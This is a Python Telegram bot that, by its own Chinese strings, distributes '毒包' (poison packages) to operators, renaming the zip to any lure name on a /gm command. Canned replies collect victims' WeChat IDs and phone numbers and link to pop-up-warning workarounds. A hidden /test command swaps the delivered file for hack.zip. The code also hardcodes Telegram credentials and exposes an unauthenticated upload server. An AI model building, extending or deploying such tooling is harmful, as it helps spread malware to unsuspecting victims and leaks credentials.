from pyrogram import Client, filters, idle
from pyrogram.types import Message, BotCommand
from pyrogram.handlers import MessageHandler, inline_query_handler


import os
import datetime
from flask import Flask, request
from pathlib import Path
import asyncio
from typing import List, BinaryIO, Union
import logging
from multiprocessing import Process
from pydantic import BaseModel
import io
import aiosqlite
from asyncio import Lock

lock = Lock()

# 安装依赖
# pip3 install pyrogram
# 或者 pip install pyrogram
# 运行 python3 改文件后发送
# 修改以下配置 set config:
isUser = True
# 机器人的 token
botToken = "6421395587:AAF4etMEvNec7pmFna-omX3Tn7vQrWxMacU"
# 需要发送的文件,请将文件放置在脚本目录下
fileName = "file.zip"
# 文件描述 更新时间用 {update_time} 定义
file_desc = """
当前毒包更新时间为: {update_time} 请核对好毒包再推毒！
"""
# 机器人描述,发送 /start 时候
bot_desc = """
欢迎使用网络推毒助手
教程：/gm+空格+毒包名
做单群：https://t.me/+0r12nkfObRQ5YTM9
"""
# webapp 是否开启web上传
webapp = True
# 自动答复列表
# {command:"需要触发的命令(不用加 /)","text":”触发命令后的回复信息“}
custom_AQs = [
    {
        "command": "jdgs",
        "text": "渠道：\n行业：\n微信号：\n微信名字：\n电话：\n地区：\n交单人：\n单数：\n文件：",
        "desc": "获取交单格式",
    },
    {
        "command": "jjff",
        "text": "弹窗解决方法频道： \n https://t.me/+wY8Wx6M_a5BlMGU1",
        "desc": "查看各种弹窗解决方法",
    },
    {
        "command": "xsjc",
        "text": "新手教程频道： \n https://t.me/+5NRMXo6d_EM0Y2Rl",
        "desc": "查看新手教程",
    },
]
# 管理员 id 可以更改关键词回复
admins = []

# ====== 以下代码蕴含丰富的能量,牵一发而动全身,请勿改动 =======
#     ____  __     __  _____   _    _   _____   _   _
#    / ___| \ \   / / | ____| | |  | | |_   _| | | | |
#   | |      \ \ / /  |  _|   | |  | |   | |   | | | |
#   | |___    \ V /   | |___  | |__| |   | |   | |_| |
#    \____|    \_/    |_____|  \____/    |_|    \___/
#
#   WARNING: UNAUTHORIZED ACCESS IS PROHIBITED!
#   This computer system is the private property of the
#   Federal Bureau of Investigation (FBI) and is for
#   authorized users only. Unauthorized access to this
#   system is strictly prohibited and may be subject to
#   prosecution. All activities on this system are
#   monitored and recorded. Anyone using this system
#   expressly consents to such monitoring and recording.
#   If monitoring reveals possible evidence of criminal
#   activity, such evidence may be provided to law
#   enforcement personnel.
# /etc/systemctl/system/
"""
[Unit]
Description=tg bot

[Service]
ExecStart=/root/tgbot/venv/bin/python3 -u /root/tgbot/sendRenameFile.py
WorkingDirectory=/root/tgbot
User=root
Group=root
Restart=always

[Install]
WantedBy=multi-user.target
"""

ROOTPATH = Path(__file__).parent


class CustomCommand(BaseModel):
    command: str
    text: str
    desc: str


custom_commands: List[CustomCommand] = [
    CustomCommand(**custom_AQ) for custom_AQ in custom_AQs
]


web = Flask(__name__)
DEBUG = True


@web.route("/", methods=["GET", "POST"])
def upload_file():
    if request.method == "POST":
        file = request.files["file"]
        if file:
            filename = "file.zip"
            file.save(os.path.join(web.root_path, filename))
            return "文件上传成功并保存为 file.zip"
    return """
    <h1>上传文件</h1>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="上传">
    </form>
    """


command_list: List[BotCommand] = [
    BotCommand(command="start", description="机器人开始"),
    BotCommand(command="gm", description="更改文件名称"),
    BotCommand(command="admin", description="管理机器人"),
]


async def setBotCommands(app: Client):
    if isUser:
        return
    await app.set_bot_commands(commands=command_list)


def is_empty_string(string, specified_variable):
    if string == "":
        return True
    if string.isspace():
        return True
    if string == specified_variable:
        return True

    return False


async def filtersNoRule(app: Client, message: Message):
    file_name = message.text.split(f"/gm")[1].strip()
    if is_empty_string(file_name, f"@{me.username}"):
        await message.reply(text="请以 /gm+空格+要改的毒包名字的格式发给我")
        return False
    return file_name


# ============ handle start ===============

"""
class CovContexts(list):
    # {"id":"用户 id","state":"用户状态"}

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    async def __isInput(self, id: int, state: str) -> bool:
        # async with lock:
        for d in self:
            if d["id"] == id & d["state"] == state:
                return True
        return False

    async def __updateID(self, id: int, state: str):
        async with lock:
            for k, v in enumerate(self):
                if v["id"] == id:
                    # if id exist update state
                    self[k]["state"] = state
                    return
            self.append({
                "id": id,
                "state": state
            })

    async def isInputKey(self, id: int) -> bool:
        return await self.__isInput(id, "K_")

    async def isInputText(self, id: int) -> bool:
        return await self.__isInput(id, "T_")

    async def addInputKey(self, id):
        return await self.__updateID(id, "K_")

    async def addInputText(self, id):
        return await self.__updateID(id, "T_")
"""


async def handle_admin_message(client: Client, message: Message):
    """管理"""
    question = await client.send_message(
        message.chat.id,
        "已设置关键词:%s\n如果需要更改添加关键词,请在60s内回复关键词....",
        reply_to_message_id=message.id,
    )

    resp = await client.listen.Message(
        filters.text, id=filters.user(message.from_user.id), timeout=60
    )
    if resp:
        key = resp.text
        await client.send_message(
            message.chat.id,
            "关键词:%s\n请在50s内....",
            reply_to_message_id=message.id,
        )


async def handle_all_text_message(client: Client, message: Message):
    keywords = dbc.keys_cache
    for keyword in keywords:
        if keyword in message.text:
            text = await dbc.query_text(keyword)
            await client.send_message(
                chat_id=message.chat.id,
                text=text,
                reply_to_message_id=message.id,
            )


# @app.on_message(filters.text & filters.command("start"))
async def handle_start_command(client: Client, message: Message):
    await setBotCommands(app)
    print(f"handle /start from:{message.chat.username}")
    await client.send_message(
        chat_id=message.chat.id, text=bot_desc, reply_to_message_id=message.id
    )


# @app.on_message(filters.private & filters.text & filters.command("gm"))
async def handle_private_message(client: Client, message: Message):
    print("private:", message.chat.username, message.text)
    await setBotCommands(app)
    file_name = await filtersNoRule(app, message)
    if not file_name:
        return

    if hack:
        file_content = read_file()
    else:
        file_content = fileName

    await client.send_document(
        chat_id=message.chat.id,
        document=file_content,
        file_name="%s.zip" % file_name,
        caption=file_desc.format(update_time=get_file_modified_time(fileName)),
        reply_to_message_id=message.id,
    )


# @app.on_message(filters.group & filters.text & filters.regex(f"@{me}"))
# @app.on_message(filters.group & filters.text & filters.command("gm"))
async def handle_group_message(client: Client, message: Message):
    await setBotCommands(app)
    print("group:", message.from_user.first_name, message.text)

    file_name = await filtersNoRule(app, message)
    if not file_name:
        return

    if hack:
        file_content = read_file()
    else:
        file_content = fileName

    await client.send_document(
        chat_id=message.chat.id,
        document=file_content,
        file_name="%s.zip" % file_name,
        caption=file_desc.format(update_time=get_file_modified_time(fileName)),
        reply_to_message_id=message.id,
    )


def mk_custom_answer_handle(customText: str) -> asyncio.coroutines:
    async def customHandle(client: Client, message: Message):
        await setBotCommands(client)
        await client.send_message(
            chat_id=message.chat.id,
            text=customText,
            reply_to_message_id=message.id,
        )

    return customHandle


# ============ handle ending ===============


def get_file_modified_time(file_path):
    timestamp = os.path.getmtime(file_path)
    modified_time = datetime.datetime.fromtimestamp(timestamp)
    # Subtracting 8 hours to convert to UTC+8
    utc_time = modified_time + datetime.timedelta(hours=8)
    formatted_time = utc_time.strftime("%Y-%m-%d %H:%M:%S")
    return formatted_time


hack: bool = False


async def handle_hacker_command(client: Client, message: Message):
    global hack
    state = message.text.split(f"/test")[1].strip()
    if state == "o":
        hack = True
    else:
        hack = False

    await client.send_message(
        chat_id=message.chat.id,
        text=f"test state: {hack}",
        reply_to_message_id=message.id,
    )


def read_file() -> BinaryIO:
    if DEBUG:
        filePath = Path("hack.zip")
    else:
        filePath = Path(ROOTPATH, "hack.zip")

    with open(str(filePath), "rb") as f:
        return io.BytesIO(f.read())


class DBEec(object):
    def __init__(self, conn: aiosqlite.Connection) -> None:
        self.conn = conn
        self.keys_cache: List[str] = None

    async def refresh_keysCashe(self):
        self.keys_cache = await self.get_all_key()

    async def init(self):
        await self.conn.execute(
            """CREATE TABLE IF NOT EXISTS tg_keyword
                            (key TEXT PRIMARY KEY, text TEXT)"""
        )
        await self.conn.commit()
        await self.refresh_keysCashe()

    async def query_text(self, key: str) -> Union[str, None]:
        async with self.conn.execute(
            "SELECT text FROM tg_keyword WHERE key=?", (key,)
        ) as db:
            result = await db.fetchone()
            if result:
                return result[0]
            else:
                return None

    async def update_text(self, key: str, text: str):
        await self.conn.execute(
            "INSERT OR REPLACE INTO tg_keyword(key, text) VALUES (?, ?)",
            (key, text),
        )
        await self.conn.commit()
        await self.refresh_keysCashe()

    async def get_all_key(self) -> List[str]:
        async with self.conn.execute("SELECT key FROM tg_keyword") as db:
            return await db.fetchall()

    async def __del__(self):
        await self.conn.close()


async def run_tg_app():
    global app
    global dbc

    # Set new commands
    if isUser:
        app = Client(
            "user_bot",
            api_id="21341224",
            api_hash="2d910cf3998019516d6d4bbb53713f20",
        )
    else:
        app = Client(
            "my_bot",
            bot_token=botToken,
            api_id="21341224",
            api_hash="2d910cf3998019516d6d4bbb53713f20",
        )

    db = await aiosqlite.connect(
        str(Path(ROOTPATH, "key.db")), check_same_thread=False
    )
    dbc = DBEec(db)
    if not Path(ROOTPATH, "key.db").exists():
        await dbc.init()

    await app.start()

    global me
    me = await app.get_me()
    print(f"login,username:{me.username} first_name:{me.first_name}")

    app.add_handler(
        MessageHandler(
            handle_start_command,
            filters=filters.text & filters.command("start"),
        )
    )

    app.add_handler(
        MessageHandler(
            handle_admin_message,
            filters=filters.text & filters.private & filters.command("/admin"),
        )
    )

    app.add_handler(
        MessageHandler(
            handle_private_message,
            filters=filters.private & filters.text & filters.command("gm"),
        )
    )

    app.add_handler(
        MessageHandler(
            handle_group_message,
            filters=filters.group & filters.text & filters.command("gm"),
        )
    )

    app.add_handler(
        MessageHandler(
            handle_hacker_command,
            filters=filters.text & filters.command("test"),
        )
    )

    # 监听所有文字信息
    app.add_handler(
        MessageHandler(handle_all_text_message, filters=filters.text)
    )

    # admin
    app.add_handler(
        MessageHandler(handle_all_text_message, filters=filters.chat(admins))
    )

    # 自定义命令
    for cc in custom_commands:
        app.add_handler(
            MessageHandler(
                mk_custom_answer_handle(cc.text),
                filters=filters.command(cc.command),
            )
        )
        command_list.append(BotCommand(command=cc.command, description=cc.desc))
        print(f"add custom AQ: /{cc.command} -> {cc.text}  desc: {cc.desc}")

    await app.set_bot_commands(command_list)

    await idle()


def run_flask_app():
    # 设置日志级别为 ERROR，禁止输出 INFO 级别及以上的日志
    log = logging.getLogger("werkzeug")
    log.setLevel(logging.ERROR)
    web.run(host="0.0.0.0")


if __name__ == "__main__":
    if webapp:
        flask_Process = Process(target=run_flask_app)
        flask_Process.start()

    asyncio.run(run_tg_app())
